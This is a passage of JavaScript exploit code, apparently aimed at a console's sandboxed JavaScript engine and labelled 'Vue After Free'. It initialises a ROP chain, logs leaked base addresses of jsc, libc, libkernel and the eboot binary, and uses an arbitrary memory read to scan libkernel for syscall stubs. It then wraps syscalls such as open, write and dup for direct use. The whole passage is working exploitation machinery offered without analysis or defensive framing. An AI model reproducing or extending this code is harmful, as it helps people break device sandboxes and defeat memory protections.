    Object.defineProperty(f, 'addr', { value: addr })

    return f
  }
}

rop.init()

var sceKernelGetModuleInfoForUnwind = fn.create(libc_addr.add(0x5F0), ['bigint'], 'bigint')

var libkernel_addr = utils.base_addr(_error_addr)

log(`jsc address: ${jsc_addr}`)
log(`libc address: ${libc_addr}`)
log(`libkernel address: ${libkernel_addr}`)
log(`eboot address: ${eboot_addr}`)

var syscalls = {
  pattern: [0x48, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x49, 0x89, 0xCA, 0x0F, 0x05],
  map: new Map(),
  init: function (addr) {
    var offset = 0
    var count = 0x40000

    var start_offset = 0
    var pattern_idx = 0
    while (offset < count) {
      var val = mem.read8(addr.add(offset))
      for (var i = 0; i < val.u8.length; i++) {
        var b = val.u8[i]
        var c = syscalls.pattern[pattern_idx]
        if (b === c || (c === 0xFF && b < c)) {
          if (pattern_idx === 0) {
            start_offset = offset
          } else if (pattern_idx === syscalls.pattern.length - 1) {
            var match = mem.read8(addr.add(start_offset))

            var id = match.shl(8).hi()

            syscalls.map.set(id, addr.add(start_offset))

            pattern_idx = 0
            continue
          }

          pattern_idx++
        } else {
          pattern_idx = 0
        }

        offset++
      }
    }
  },
  clear: function () {
    syscalls.map.clear()
  }
}

syscalls.init(libkernel_addr)

debug(`Found ${syscalls.map.size} syscalls`)

var _error = fn.create(_error_addr, [], 'bigint')
var strerror = fn.create(strerror_addr, ['bigint'], 'string')
var getpid = fn.create(0x14, [], 'bigint')
var dup = fn.create(0x29, ['bigint'], 'bigint')
var write = fn.create(0x4, ['bigint', 'bigint', 'number'], 'bigint')
var open = fn.create(0x5, ['string', 'number', 'number'], 'bigint')
var close = fn.create(0x6, ['bigint'], 'bigint')

utils.notify('Vue After Free')
